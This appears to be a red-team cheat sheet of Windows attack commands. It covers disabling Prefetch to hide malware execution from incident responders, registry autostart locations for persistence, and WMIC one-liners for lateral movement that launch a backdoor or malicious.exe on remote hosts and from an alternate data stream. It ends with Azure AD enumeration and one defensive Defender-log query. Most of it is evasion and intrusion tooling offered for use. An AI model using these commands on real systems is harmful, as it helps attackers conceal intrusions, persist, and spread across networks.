# :fu: Anti-Forensics

## Disabling Prefetch:

What are Prefetch Files? Prefetch files are great artifacts for forensic investigators trying to analyze applications that have been run on a system. Windows creates a prefetch file when an application is run from a particular location for the very first time. This is used to help speed up the loading of applications. But if we disable Prefetch files, we can hide execution patterns of our malware to hinder incident response.

The following command requires Administrator privileges, but disables Prefetch within the registry. While this tactic may appear anomalous to network defenders such as clearing Security Event Logs, it will obfuscate the malware's execution history.

```
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /f /d 0
```

## Windows AutoStart Persistence Locations:

Locations for automatically starting at system boot or user logon

```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Debug Tools-%LOCALAPPDATA%\
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
software\microsoft\windows\currentversion\run\microsoft windows html help
%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices 
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
```

## WMIC Tricks and Tips:

Enumeration

```
wmic environment list
wmic useraccount get /ALL /format:csv
wmic process get caption,executablepath,commandline /format:csv
wmic qfe get description,installedOn /format:csv
# PowerShell
Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}
```

Lateral Movement

```
wmic /node:<IP> /user:administrator process call create "cmd.exe /c <backdoor>"
```

Uninstall Program

```
wmic /node:"#{node}" product where "name like '#{product}%%'" call uninstall
```

Execute a .EXE file stored as an Alternate Data Stream (ADS)

```
wmic.exe process call create "c:\ads\notsus.txt:malicious.exe"
```

Execute malicious.exe on a remote system

```
wmic.exe /node:"192.168.0.99" process call create "malicious.exe"
```

## Offline Microsoft Azure Active Directory Harvesting with PowerShell:

This script demonstrates how to interact with Microsoft Azure Active Directory via PowerShell.  You will need an Azure AD account first, which is free: http://azure.microsoft.com/en-us/services/active-directory/

```
# Import the Azure AD PowerShell module:
Import-Module -Name Azure
# List the cmdlets provided by the module (750+):
Get-Command -Module Azure 
Add-AzureAccount
Get-AzureAccount
Get-AzureSubscription

# Import the Azure AD PowerShell module for MSOnline:
Import-Module -Name MSOnline
# List the cmdlets provided by the MSOnline module:
Get-Command -Module MSOnline

# Connect and authenticate to Azure AD, where your username will
# be similar to '<yourusername>@<yourdomain>.onmicrosoft.com':
$creds = Get-Credential
Connect-MsolService -Credential $creds


# Get subscriber company contact information:
Get-MsolCompanyInformation


# Get subscription and license information:
Get-MsolSubscription | Format-List *
Get-MsolAccountSku   | Format-List *


# Get Azure AD users:
Get-MsolUser


# Get list of Azure AD management roles:
Get-MsolRole


# Show the members of each management role:
Get-MsolRole | ForEach { "`n`n" ; "-" * 30 ; $_.Name ; "-" * 30 ; Get-MsolRoleMember -RoleObjectId $_.ObjectId | ForEach { $_.DisplayName } }
```

## PowerShell:

Pull Windows Defender event logs 1116 (malware detected) and 1117 (malware blocked)
from a saved evtx file:

```
PS C:\> Get-WinEvent -FilterHashtable @{path="WindowsDefender.evtx";id=1116,1117}
```
